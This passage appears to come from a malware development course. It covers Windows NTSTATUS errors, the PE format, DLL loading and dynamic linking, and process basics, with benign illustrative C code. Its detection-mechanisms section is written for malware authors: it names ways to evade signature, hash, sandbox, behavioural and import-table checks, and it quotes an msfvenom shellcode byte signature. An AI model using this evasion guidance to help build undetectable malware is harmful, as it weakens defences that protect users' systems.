- `87`??- ERROR_INVALID_PARAMETER
    

### Windows Native API Debugging Errors

Recall from the??_Windows Architecture_??module, NTAPIs are mostly exported from??`ntdll.dll`. Unlike Windows APIs, these functions cannot have their error code fetched via??`GetLastError`. Instead, they return the error code directly which is represented by the??`NTSTATUS`??data type.

`NTSTATUS`??is used to represent the status of a system call or function and is defined as a 32-bit unsigned integer value. A successful system call will return the value??`STATUS_SUCCESS`, which is??`0`. On the other hand, if the call failed it will return a non-zero value, to further investigate the cause of the problem, one must check??[Microsoft's documentation on NTSTATUS values](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55).

The code snippet below shows how error checking for system calls is done.

```c
NTSTATUS STATUS = NativeSyscallExample(...);
if (STATUS != STATUS_SUCCESS){
    // printing the error in unsigned integer hexadecimal format
    printf("[!] NativeSyscallExample Failed With Status : 0x%0.8X \n", STATUS); 
}

// NativeSyscallExample succeeded
```

#### NT_SUCCESS Macro

Another way to check the return value of NTAPIs is through the??`NT_SUCCESS`??macro shown??[here](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-ntstatus-values). The macro returns??`TRUE`??if the function succeeded, and??`FALSE`??it fails.

```c
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
```

Below, is an example of using this macro

```c
NTSTATUS STATUS = NativeSyscallExample(...);
if (!NT_SUCCESS(STATUS)){
    // printing the error in unsigned integer hexadecimal format
    printf("[!] NativeSyscallExample Failed With Status : 0x%0.8X \n", STATUS); 
}

// NativeSyscallExample succeeded
```
# 1.6 Portable Executable Format

### Introduction

Portable Executable (PE) is the file format for executables on Windows. A few examples of PE file extensions are??`.exe`,??`.dll`,??`.sys`??and??`.scr`. This module discusses the PE structure which is important to know when building or reverse engineering malware.

Note that this module and future modules will often interchangeably refer to executables (e.g. EXEs, DLLs) as "Images".

### PE Structure

The diagram below shows a simplified structure of a Portable Executable. Every header shown in the image is defined as a data structure that holds information about the PE file. Each data structure will be explained in detail in this module.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/pe-structure.png)

  

#### DOS Header (IMAGE_DOS_HEADER)

This first header of a PE file is always prefixed with two bytes,??`0x4D`??and??`0x5A`, commonly referred to as??`MZ`. These bytes represent the DOS header signature, which is used to confirm that the file being parsed or inspected is a valid PE file. The DOS header is a data structure, defined as follows:

```c
typedef struct _IMAGE_DOS_HEADER {      // DOS .EXE header
    WORD   e_magic;                     // Magic number
    WORD   e_cblp;                      // Bytes on last page of file
    WORD   e_cp;                        // Pages in file
    WORD   e_crlc;                      // Relocations
    WORD   e_cparhdr;                   // Size of header in paragraphs
    WORD   e_minalloc;                  // Minimum extra paragraphs needed
    WORD   e_maxalloc;                  // Maximum extra paragraphs needed
    WORD   e_ss;                        // Initial (relative) SS value
    WORD   e_sp;                        // Initial SP value
    WORD   e_csum;                      // Checksum
    WORD   e_ip;                        // Initial IP value
    WORD   e_cs;                        // Initial (relative) CS value
    WORD   e_lfarlc;                    // File address of relocation table
    WORD   e_ovno;                      // Overlay number
    WORD   e_res[4];                    // Reserved words
    WORD   e_oemid;                     // OEM identifier (for e_oeminfo)
    WORD   e_oeminfo;                   // OEM information; e_oemid specific
    WORD   e_res2[10];                  // Reserved words
    LONG   e_lfanew;                    // Offset to the NT header
  } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
```

The most important members of the struct are??`e_magic`??and??`e_lfanew`.

`e_magic`??is 2 bytes with a fixed value of??`0x5A4D`??or??`MZ`.

`e_lfanew`??is a 4-byte value that holds an offset to the start of the NT Header. Note that??`e_lfanew`??is always located at an offset of??`0x3C`.

#### DOS Stub

Before moving on to the NT header structure, there is the DOS stub which is an error message that prints "This program cannot be run in DOS mode" in case the program is loaded in??[DOS mode](https://en.wikipedia.org/wiki/DOS)??or "Disk Operating Mode". It is worth noting that the error message can be changed by the programmer at compile time. This is not a PE header, but it's good to be aware of it.

#### NT Header (IMAGE_NT_HEADERS)

The NT header is essential as it incorporates two other image headers:??`FileHeader`??and??`OptionalHeader`, which include a large amount of information about the PE file. Similarly to the DOS header, the NT header contains a signature member that is used to verify it. Usually, the signature element is equal to the "PE" string, which is represented by the??`0x50`??and??`0x45`??bytes. But since the signature is of data type??`DWORD`, the signature will be represented as??`0x50450000`, which is still "PE", except that it is padded with two null bytes. The NT header can be reached using the??`e_lfanew`??member inside of the DOS Header.

The NT header structure varies depending on the machine's architecture.

**32-bit Version:**

```c
typedef struct _IMAGE_NT_HEADERS {
  DWORD                   Signature;
  IMAGE_FILE_HEADER       FileHeader;
  IMAGE_OPTIONAL_HEADER32 OptionalHeader;
} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;
```

**64-bit Version:**

```c
typedef struct _IMAGE_NT_HEADERS64 {
    DWORD                   Signature;
    IMAGE_FILE_HEADER       FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;
```

The only difference is the??`OptionalHeader`??data structure,??`IMAGE_OPTIONAL_HEADER32`??and??`IMAGE_OPTIONAL_HEADER64`.

#### File Header (IMAGE_FILE_HEADER)

Moving on to the next header, which can be accessed from the previous NT Header data structure

```c
typedef struct _IMAGE_FILE_HEADER {
  WORD  Machine;
  WORD  NumberOfSections;
  DWORD TimeDateStamp;
  DWORD PointerToSymbolTable;
  DWORD NumberOfSymbols;
  WORD  SizeOfOptionalHeader;
  WORD  Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
```

The most important struct members are:

- `NumberOfSections`??- The number of sections in the PE file (discussed later).
    
- `Characteristics`??- Flags that specify certain attributes about the executable file, such as whether it is a dynamic-link library (DLL) or a console application.
    
- `SizeOfOptionalHeader`??- The size of the following optional header
    

Additional information about the file header can be found on the??[official documentation page](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_file_header).

#### Optional Header (IMAGE_OPTIONAL_HEADER)

The optional header is important and although it's called "optional", it's essential for the execution of the PE file. It is referred to as optional because some file types do not have it.

The optional header has two versions, a version for 32-bit and 64-bit systems. Both versions have nearly identical members in their data structure with the main difference being the size of some members.??`ULONGLONG`??is used in the 64-bit version and??`DWORD`??in the 32-bit version. Additionally, the 32-bit version has some members which are not found in the 64-bit version.

**32-bit Version:**

```c
typedef struct _IMAGE_OPTIONAL_HEADER {
  WORD                 Magic;
  BYTE                 MajorLinkerVersion;
  BYTE                 MinorLinkerVersion;
  DWORD                SizeOfCode;
  DWORD                SizeOfInitializedData;
  DWORD                SizeOfUninitializedData;
  DWORD                AddressOfEntryPoint;
  DWORD                BaseOfCode;
  DWORD                BaseOfData;
  DWORD                ImageBase;
  DWORD                SectionAlignment;
  DWORD                FileAlignment;
  WORD                 MajorOperatingSystemVersion;
  WORD                 MinorOperatingSystemVersion;
  WORD                 MajorImageVersion;
  WORD                 MinorImageVersion;
  WORD                 MajorSubsystemVersion;
  WORD                 MinorSubsystemVersion;
  DWORD                Win32VersionValue;
  DWORD                SizeOfImage;
  DWORD                SizeOfHeaders;
  DWORD                CheckSum;
  WORD                 Subsystem;
  WORD                 DllCharacteristics;
  DWORD                SizeOfStackReserve;
  DWORD                SizeOfStackCommit;
  DWORD                SizeOfHeapReserve;
  DWORD                SizeOfHeapCommit;
  DWORD                LoaderFlags;
  DWORD                NumberOfRvaAndSizes;
  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;
```

**64-bit Version:**

```c
typedef struct _IMAGE_OPTIONAL_HEADER64 {
  WORD                 Magic;
  BYTE                 MajorLinkerVersion;
  BYTE                 MinorLinkerVersion;
  DWORD                SizeOfCode;
  DWORD                SizeOfInitializedData;
  DWORD                SizeOfUninitializedData;
  DWORD                AddressOfEntryPoint;
  DWORD                BaseOfCode;
  ULONGLONG            ImageBase;
  DWORD                SectionAlignment;
  DWORD                FileAlignment;
  WORD                 MajorOperatingSystemVersion;
  WORD                 MinorOperatingSystemVersion;
  WORD                 MajorImageVersion;
  WORD                 MinorImageVersion;
  WORD                 MajorSubsystemVersion;
  WORD                 MinorSubsystemVersion;
  DWORD                Win32VersionValue;
  DWORD                SizeOfImage;
  DWORD                SizeOfHeaders;
  DWORD                CheckSum;
  WORD                 Subsystem;
  WORD                 DllCharacteristics;
  ULONGLONG            SizeOfStackReserve;
  ULONGLONG            SizeOfStackCommit;
  ULONGLONG            SizeOfHeapReserve;
  ULONGLONG            SizeOfHeapCommit;
  DWORD                LoaderFlags;
  DWORD                NumberOfRvaAndSizes;
  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;
```

The optional header contains a ton of information that can be used. Below are some of the struct members that are commonly used:

- `Magic`??- Describes the state of the image file (32 or 64-bit image)
    
- `MajorOperatingSystemVersion`??- The major version number of the required operating system (e.g. 11, 10)
    
- `MinorOperatingSystemVersion`??- The minor version number of the required operating system (e.g. 1511, 1507, 1607)
    
- `SizeOfCode`??- The size of the??`.text`??section (Discussed later)
    
- `AddressOfEntryPoint`??- Offset to the entry point of the file (Typically the??_main_??function)
    
- `BaseOfCode`??- Offset to the start of the??`.text`??section
    
- `SizeOfImage`??- The size of the image file in bytes
    
- `ImageBase`??- It specifies the preferred address at which the application is to be loaded into memory when it is executed. However, due to Window's memory protection mechanisms like Address Space Layout Randomization (ASLR), it's rare to see an image mapped to its preferred address because the Windows PE Loader maps the file to a different address. This random allocation done by the Windows PE loader will cause issues in the implementation of future techniques because some addresses that are considered constant were changed. The Windows PE loader will then go through??_PE relocation_??to fix these addresses.
    
- `DataDirectory`??- One of the most important members in the optional header. This is an array of??[IMAGE_DATA_DIRECTORY](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_data_directory), which contains the directories in a PE file (discussed below).
    

##### Data Directory

The Data Directory can be accessed from the optional's header last member. This is an array of data type??`IMAGE_DATA_DIRECTORY`??which has the following data structure:

```c
typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD   VirtualAddress;
    DWORD   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
```

The Data Directory array is of size??`IMAGE_NUMBEROF_DIRECTORY_ENTRIES`??which is a constant value of??`16`. Each element in the array represents a specific data directory which includes some data about a PE section or a Data Table (the place where specific information about the PE is saved).

A specific data directory can be accessed using its index in the array.

```c
#define IMAGE_DIRECTORY_ENTRY_EXPORT          0   // Export Directory
#define IMAGE_DIRECTORY_ENTRY_IMPORT          1   // Import Directory
#define IMAGE_DIRECTORY_ENTRY_RESOURCE        2   // Resource Directory
#define IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   // Exception Directory
#define IMAGE_DIRECTORY_ENTRY_SECURITY        4   // Security Directory
#define IMAGE_DIRECTORY_ENTRY_BASERELOC       5   // Base Relocation Table
#define IMAGE_DIRECTORY_ENTRY_DEBUG           6   // Debug Directory
#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   // Architecture Specific Data
#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   // RVA of GP
#define IMAGE_DIRECTORY_ENTRY_TLS             9   // TLS Directory
#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   // Load Configuration Directory
#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   // Bound Import Directory in headers
#define IMAGE_DIRECTORY_ENTRY_IAT            12   // Import Address Table
#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   // Delay Load Import Descriptors
#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   // COM Runtime descriptor
```

The two sections below will briefly mention two important data directories, the??`Export Directory`??and??`Import Address Table`.

##### Export Directory

A PE's export directory is a data structure that contains information about functions and variables that are exported from the executable. It contains the addresses of the exported functions and variables, which can be used by other executable files to access the functions and data. The export directory is generally found in DLLs that export functions (e.g.??`kernel32.dll`??exporting??`CreateFileA`).

##### Import Address Table

The import address table is a data structure in a PE that contains information about the addresses of functions imported from other executable files. The addresses are used to access the functions and data in the other executables (e.g.??`Application.exe`??importing??`CreateFileA`??from??`kernel32.dll`).

#### PE Sections

PE sections contain the code and data used to create an executable program. Each PE section is given a unique name and typically contains executable code, data, or resource information. There is no constant number of PE sections because different compilers can add, remove or merge sections depending on the configuration. Some sections can also be added later on manually, therefore it is dynamic and the??`IMAGE_FILE_HEADER.NumberOfSections`??helps determine that number.

The following PE sections are the most important ones and exist in almost every PE.

- `.text`??- Contains the executable code which is the written code.
    
- `.data`??- Contains initialized data which are variables initialized in the code.
    
- `.rdata`??- Contains read-only data. These are constant variables prefixed with??`const`.
    
- `.idata`??- Contains the import tables. These are tables of information related to the functions called using the code. This is used by the Windows PE Loader to determine which DLL files to load to the process, along with what functions are being used from each DLL.
    
- `.reloc`??- Contains information on how to fix up memory addresses so that the program can be loaded into memory without any errors.
    
- `.rsrc`??- Used to store resources such as icons and bitmaps
    

Each PE section has an??[IMAGE_SECTION_HEADER](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_section_header)??data structure that contains valuable information about it. These structures are saved under the NT headers in a PE file and are stacked above each other where each structure represents a section.

Recall, the IMAGE_SECTION_HEADER structure is as follows:

```c
typedef struct _IMAGE_SECTION_HEADER {
  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];
  union {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
  } Misc;
  DWORD VirtualAddress;
  DWORD SizeOfRawData;
  DWORD PointerToRawData;
  DWORD PointerToRelocations;
  DWORD PointerToLinenumbers;
  WORD  NumberOfRelocations;
  WORD  NumberOfLinenumbers;
  DWORD Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
```

looking at the elements, every single one is highly valuable and important:

- `Name`??- The name of the section. (e.g. .text, .data, .rdata).
    
- `PhysicalAddress`??or??`VirtualSize`??- The size of the section when it is in memory.
    
- `VirtualAddress`??- Offset of the start of the section in memory.
    

### Additional References

In case further clarification is required on certain sections, the following blog posts on??[0xRick's Blog](https://0xrick.github.io/)??are highly recommended.

- PE Overview -??[https://0xrick.github.io/win-internals/pe2/](https://0xrick.github.io/win-internals/pe2/)
    
- DOS Header, DOS Stub and Rich Header -??[https://0xrick.github.io/win-internals/pe3/](https://0xrick.github.io/win-internals/pe3/)
    
- NT Headers -??[https://0xrick.github.io/win-internals/pe4/](https://0xrick.github.io/win-internals/pe4/)
    
- Data Directories, Section Headers and Sections -??[https://0xrick.github.io/win-internals/pe5/](https://0xrick.github.io/win-internals/pe5/)
    
- PE Imports (Import Directory Table, ILT, IAT) -??[https://0xrick.github.io/win-internals/pe6/](https://0xrick.github.io/win-internals/pe6/)
    

### Conclusion

Understanding PE headers might be challenging the first time they are encountered. Luckily, none of the basic modules require an in-depth understanding of the PE structure. However, to make the malware perform more complex techniques, it will require a better understanding as some of the code requires parsing the PE file's headers and sections. This will likely be seen in intermediate and advanced modules.
# 1.7 Dynamic-Link Library (DLL)

### Introduction

Both??`.exe`??and??`.dll`??file types are considered portable executable formats but there are differences between the two. This module explains the difference between the two file types.

### What is a DLL?

DLLs are shared libraries of executable functions or data that can be used by multiple applications simultaneously. They are used to export functions to be used by a process. Unlike EXE files, DLL files cannot execute code on their own. Instead, DLL libraries need to be invoked by other programs to execute the code. As previously mentioned, the??`CreateFileW`??is exported from??`kernel32.dll`, therefore if a process wants to call that function it would first need to load??`kernel32.dll`??into its address space.

Some DLLs are automatically loaded into every process by default since these DLLs export functions that are necessary for the process to execute properly. A few examples of these DLLs are??`ntdll.dll`,??`kernel32.dll`??and??`kernelbase.dll`. The image below shows several DLLs that are currently loaded by the??`explorer.exe`??process.

![Explorer-DLLs](https://maldevacademy.s3.amazonaws.com/images/Basic/8-dynamic-library-link/loaded-libraries.png)

### System-Wide DLL Base Address

The Windows OS uses a system-wide DLL base address to load some DLLs at the same base address in the virtual address space of all processes on a given machine to optimize memory usage and improve system performance. The following image shows??`kernel32.dll`??being loaded at the same address (`0x7fff9fad0000`) among multiple running processes.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/dll-new-221233432-97a38697-bd82-45f8-ad5f-90d674de8b17.png)

### Why Use DLLs?

There are several reasons why DLLs are very often used in Windows:

1. **Modularization of Code**??- Instead of having one massive executable that contains the entire functionality, the code is divided into several independent libraries with each library being focused on specific functionality. Modularization makes it easier for developers during development and debugging.

2. **Code Reuse**??- DLLs promote code reuse since a library can be invoked by multiple processes.

3. **Efficient Memory Usage**??- When several processes need the same DLL, they can save memory by sharing that DLL instead of loading it into the process's memory.


### DLL Entry Point

DLLs can optionally specify an entry point function that executes code when a certain task occurs such as when a process loads the DLL library. There are 4 possibilities for the entry point being called:

- `DLL_PROCESS_ATTACHED`??- A process is loading the DLL.

- `DLL_THREAD_ATTACHED`??- A process is creating a new thread.

- `DLL_THREAD_DETACH`??- A thread exits normally.

- `DLL_PROCESS_DETACH`??- A process unloads the DLL.


### Sample DLL Code

The code below shows a typical DLL code structure.

```c
BOOL APIENTRY DllMain(
    HANDLE hModule,             // Handle to DLL module
    DWORD ul_reason_for_call,   // Reason for calling function
    LPVOID lpReserved           // Reserved
) {
    
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACHED: // A process is loading the DLL.
        // Do something here
        break;
        case DLL_THREAD_ATTACHED: // A process is creating a new thread.
        // Do something here
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        // Do something here
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        // Do something here
        break;
    }
    return TRUE;
}
```

### Exporting a Function

DLLs can export functions that can then be used by the calling application or process. To export a function it needs to be defined using the keywords??`extern`??and??`__declspec(dllexport)`. An example exported function??`HelloWorld`??is shown below.

```c
////// sampleDLL.dll //////

extern __declspec(dllexport) void HelloWorld(){
// Function code here
}
```

### Dynamic Linking

It's possible to use the??`LoadLibrary`,??`GetModuleHandle`??and??`GetProcAddress`??WinAPIs to import a function from a DLL. This is referred to as??[dynamic linking](https://learn.microsoft.com/en-us/windows/win32/dlls/run-time-dynamic-linking). This is a method of loading and linking code (DLLs) at runtime rather than linking them at compile time using the linker and import address table.

There are several advantages of using dynamic linking, these are documented by Microsoft??[here](https://learn.microsoft.com/en-us/windows/win32/dlls/advantages-of-dynamic-linking).

This section walks through the steps of loading a DLL, retrieving the DLL's handle, retrieving the exported function's address and then invoking the function.

#### Loading a DLL

Calling a function such as??[MessageBoxA](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa)??in an application will force the Windows OS to load the DLL exporting the??`MessageBoxA`??function into the calling process's memory address space, which in this case is??`user32.dll`. Loading??`user32.dll`??was done automatically by the OS when the process started and not by the code.

However, in some cases such as the??`HelloWorld`??function in??`sampleDLL.dll`, the DLL may not be loaded into memory. For the application to call the??`HelloWorld`??function, it first needs to retrieve the DLL's handle that is exporting the function. If the application doesn't have??`sampleDLL.dll`??loaded into memory, it would require the usage of the??[LoadLibrary](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)??WinAPI, as shown below.

```c
HMODULE hModule = LoadLibraryA("sampleDLL.dll"); // hModule now contain sampleDLL.dll's handle
```

#### Retrieving a DLL's Handle

If??`sampleDLL.dll`??is already loaded into the application's memory, one can retrieve its handle via the??[GetModuleHandle](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)??WinAPI function without leveraging the??`LoadLibrary`??function.

```c
HMODULE hModule = GetModuleHandleA("sampleDLL.dll");
```

#### Retrieving a Function's Address

Once the DLL is loaded into memory and the handle is retrieved, the next step is to retrieve the function's address. This is done using the??[GetProcAddress](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)??WinAPI which takes the handle of the DLL that exports the function and the function name.

```c
PVOID pHelloWorld = GetProcAddress(hModule, "HelloWorld");
```

#### Invoking The Function

Once??`HelloWorld`'s address is saved into the??`pHelloWorld`??variable, the next step is to perform a type-cast on this address to??`HelloWorld`'s function pointer. This function pointer is required in order to invoke the function.

```c
// Constructing a new data type that represents HelloWorld's function pointer 
typedef void (WINAPI* HelloWorldFunctionPointer)();  

void call(){
    HMODULE hModule = LoadLibraryA("sampleDLL.dll");
    PVOID pHelloWorld = GetProcAddress(hModule, "HelloWorld");
    // Type-casting the 'pHelloWorld' variable to be of type 'HelloWorldFunctionPointer' 
    HelloWorldFunctionPointer HelloWorld = (HelloWorldFunctionPointer)pHelloWorld;
    HelloWorld();   // Calling the 'HelloWorld' function via its function pointer 
}
```

### Dynamic Linking Example

The code below demonstrates another simple example of dynamic linking where??`MessageBoxA`??is called. The code assumes that??`user32.dll`, the DLL that exports that function, isn't loaded into memory. Recall that if a DLL isn't loaded into memory the usage of??`LoadLibrary`??is required to load that DLL into the process's address space.

```c
typedef int (WINAPI* MessageBoxAFunctionPointer)( // Constructing a new data type, that will represent MessageBoxA's function pointer 
  HWND          hWnd,
  LPCSTR        lpText,
  LPCSTR        lpCaption,
  UINT          uType
);

void call(){
    // Retrieving MessageBox's address, and saving it to 'pMessageBoxA' (MessageBoxA's function pointer)
    MessageBoxAFunctionPointer pMessageBoxA = (MessageBoxAFunctionPointer)GetProcAddress(LoadLibraryA("user32.dll"), "MessageBoxA");
    if (pMessageBoxA != NULL){
        // Calling MessageBox via its function pointer if not null    
        pMessageBoxA(NULL, "MessageBox's Text", "MessageBox's Caption", MB_OK); 
    }
}
```

### Function Pointers

For the remainder of the course, the function pointer data types will have a naming convention that uses the WinAPI's name prefixed with??`fn`, which stands for "function pointer". For example, the above??`MessageBoxAFunctionPointer`??data type will be represented as??`fnMessageBoxA`. This is used to maintain simplicity and improve clarity throughout the course.

### Rundll32.exe

There are a couple of ways to run exported functions without using a programmatical method. One common technique is to use the??[rundll32.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32)??binary.??`Rundll32.exe`??is a built-in Windows binary that is used to run an exported function of a DLL file. To run an exported function use the following command:

```c
rundll32.exe <dllname>, <function exported to run>
```

For example,??`User32.dll`??exports the function??`LockWorkStation`??which locks the machine. To run the function, use the following command:

```c
rundll32.exe user32.dll,LockWorkStation
```

### Creating a DLL File With Visual Studio

To create a DLL file, launch Visual studio and create a new project. When given the project templates, select the??`Dynamic-Link Library (DLL)`??option.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/create-dll-1.png)

  

Next, select the location where to save the project files. When that's done, the following C code should appear.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/create-dll-2.png)

  

The provided DLL template comes with??`framework.h`,??`pch.h`??and??`pch.cpp`??which are known as??[Precompiled Headers](https://en.wikipedia.org/wiki/Precompiled_header). These are files used to make the project compilation faster for large projects. It is unlikely that these will be required in this situation and therefore it is recommended to delete these files. To do so, highlight the file and press the delete key and select the 'Delete' option.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/create-dll-3-1.png)

  

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/create-dll-3.png)

  

After deleting the precompiled headers, the compiler's default settings must be changed to confirm that precompiled headers should not be used in the project.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/create-dll-4.png)

  

Go to??**C/C++ > Precompiled Header**

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/create-dll-5.png)

  

Change the 'Precompiled Header' option to 'Not Using Precompiled Headers' and press 'Apply'.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/create-dll-6.png)

  

Finally, change the??`dllmain.cpp`??file to??`dllmain.c`. This is required since the provided code snippets in Maldev Academy use C instead of C++. To compile the program, click Build > Build Solution and a DLL will be created under the??_Release_??or??_Debug_??folder, depending on the compile configuration.
# 1.8 Detection Mechanisms

### Introduction

Security solutions use several techniques to detect malicious software. It's important for one to understand what techniques security solutions use to detect or classify software as being malicious.

### Static/Signature Detection

A signature is a number of bytes or strings within a malware that uniquely identifies it. Other conditions can also be specified such as variable names and imported functions. Once the security solution scans a program, it attempts to match it to a list of known rules. These rules have to be pre-built and pushed to the security solution.??[YARA](https://virustotal.github.io/yara/)??is one tool that is used by security vendors to build detection rules. For example, if a shellcode contains a byte sequence that begins with??`FC 48 83 E4 F0 E8 C0 00 00 00 41 51 41 50 52 51`??then this can be used to detect that the payload is a Msfvenom's x64 exec payload. The same detection mechanism can be used against strings within the file.

Signature detection is easy to bypass but can be time-consuming. It's important to avoid hardcoding values in the malware that can be used to uniquely identify the implementation. The code that's presented throughout this course attempts to avoid hardcoding values that could be hardcoded and instead dynamically retrieves or calculates the values.

#### Hashing Detection

Hashing detection is a subset of static/signature detection. This is a very straightforward detection technique, and this is the fastest and simplest way a security solution can detect malware. This method is done by simply saving hashes (e.g. MD5, SHA256) about known malware in a database. The malware's file hash will be compared with the security solution's hash database to see if there's a positive match.

Evading hashing detection is extremely simple, although likely not enough on its own. By changing at least 1 byte in the file, the file hash will change for any hashing algorithm and therefore the file will have a file hash that is likely unique.

### Heuristic Detection

Since signature detection methods are easily circumvented with minor changes to a malicious file, heuristic detection was introduced to spot suspicious characteristics that can be found in unknown, new and modified versions of existing malware. Depending on the security solution, heuristic models can consist of one or both of the following:

- **Static Heuristic Analysis**??- Involves decompiling the suspicious program and comparing code snippets to known malware that are already known and are in the heuristic database. If a particular percentage of the source code matches anything in the heuristic database, the program is flagged.
    
- **Dynamic Heuristic Analysis**??- The program is placed inside a virtual environment or a??_sandbox_??which is then analyzed by the security solution for any suspicious behaviors.
    

#### Dynamic Heuristic Analysis (Sandbox Detection)

Sandbox detection dynamically analyzes the behavior of a file by executing it in a sandboxed environment. While executing the file, the security solution will look for suspicious actions or actions that are classified as malicious. For example, allocating memory is not necessarily a malicious action but allocating memory, connecting to the internet to fetch shellcode, writing the shellcode to memory and executing it in that sequence is considered malicious behavior.

Malware developers will embed anti-sandbox techniques to detect the sandbox environment. If the malware confirms that it's being executed in a sandbox then it executes benign code, otherwise, it executes malicious code.

### Behavior-based Detection

Once the malware is running, security solutions will continue to look for suspicious behavior committed by the running process. The security solution will look for suspicious indicators such as loading a DLL, calling a certain Windows API and connecting to the internet. Once the suspicious behavior is detected the security solution will conduct an in-memory scan of the running process. If the process is determined to be malicious, it is terminated.

Certain actions may terminate the process immediately without an in-memory scan being performed. For example, if the malware performs process injection into??`notepad.exe`??and connects to the internet, this will likely cause the process to be terminated immediately due to the high likelihood that this is malicious activity.

The best way to avoid behavior-based detection is by making the process behave as benign as possible (e.g. avoid spawning a cmd.exe child process). Additionally, in-memory scans can be circumvented with memory encryption. This is a more advanced topic that will be discussed in future modules.

### API Hooking

API hooking is a technique used by security solutions, mainly EDRs, to monitor the process or code execution in real time for malicious behaviors. API hooking works by intercepting commonly abused APIs and then analyzing the parameters of these APIs in real time. This is a powerful way of detection because it allows the security solution to see the content passed to the API after it's been de-obfuscated or decrypted. This detection is considered a combination of real-time and behavior-based detection.

The diagram below shows a high level of API hooking.

![API-Hooking](https://maldevacademy.s3.amazonaws.com/images/Basic/detection-mechanisms/api-hooking.png)

There are several ways to bypass API hooks such as DLL unhooking and direct syscalls. These topics will be covered in future modules.

### IAT Checking

One of the components that were discussed in the PE structure is the Import Address Table or IAT. To briefly summarize the IAT's functionality, it contains function names that are used in the PE at runtime. It also contains the libraries (DLLs) that export these functions. This information is valuable to a security solution since it knows what WinAPIs the executable is using.

For example, ransomware is used to encrypt files and therefore it will likely be using cryptographic and file management functions. When the security solution sees the IAT containing these types of functions such as??`CreateFileA/W, SetFilePointer, Read/WriteFile, CryptCreateHash, CryptHashData, CryptGetHashParam`, then either the program is flagged or additional scrutiny is placed on it. The image below shows the??`dumpbin.exe`??tool being used to check a binary's IAT.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/dumpbin-imports.png)

One solution that evades IAT scanning is the use of API hashing which will be discussed in future modules.

### Manual Analysis

Despite bypassing all the aforementioned detection mechanisms, the blue team and malware analysts can still manually analyze the malware. A defender well-versed in malware reverse engineering will likely be able to detect the malware. Furthermore, security solutions will often send a copy of suspicious files to the cloud for further analysis.

Malware developers can implement anti-reversing techniques to make the process of reverse engineering more difficult. Some techniques include the detection of a debugger and the detection of a virtualized environment which are discussed in future modules.
# 1.9 Windows Processes

### What is a Windows Process?

A Windows process is a program or application that is running on a Windows machine. A process can be started by either a user or by the system itself. The process consumes resources such as memory, disk space, and processor time to complete a task.

### Process Threads

Windows processes are made up of one or more threads that are all running concurrently. A thread is a set of instructions that can be executed independently within a process. Threads within a process can communicate and share data. Threads are scheduled for execution by the operating system and managed in the context of a process.

### Process Memory

Windows processes also use memory to store data and instructions. Memory is allocated to a process when it is created and the amount that is allocated can be set by the process itself. The operating system manages memory using both virtual and physical memory. Virtual memory allows the operating system to use more memory than what is physically available by creating a virtual address space that can be accessed by the applications. These virtual address spaces are divided into "pages" which are then allocated to processes.

### Memory Types

Processes can have different types of memory:

- **Private memory**??is dedicated to a single process and cannot be shared by other processes. This type of memory is used to store data that is specific to the process.
    
- **Mapped memory**??can be shared between two or more processes. It is used to share data between processes, such as shared libraries, shared memory segments, and shared files. Mapped memory is visible to other processes, but is protected from being modified by other processes.
    
- **Image memory**??contains the code and data of an executable file. It is used to store the code and data that is used by the process, such as the program's code, data, and resources. Image memory is often related to DLL files loaded into a process's address space.
    

### Process Environment Block (PEB)

The Process Environment Block (PEB) is a data structure in Windows that contains information about a process such as its parameters, startup information, allocated heap information, and loaded DLLs, in addition to others. It is used by the operating system to store information about processes as they are running, and is used by the Windows loader to launch applications. It also stores information about the process such as the process ID (PID) and the path to the executable.

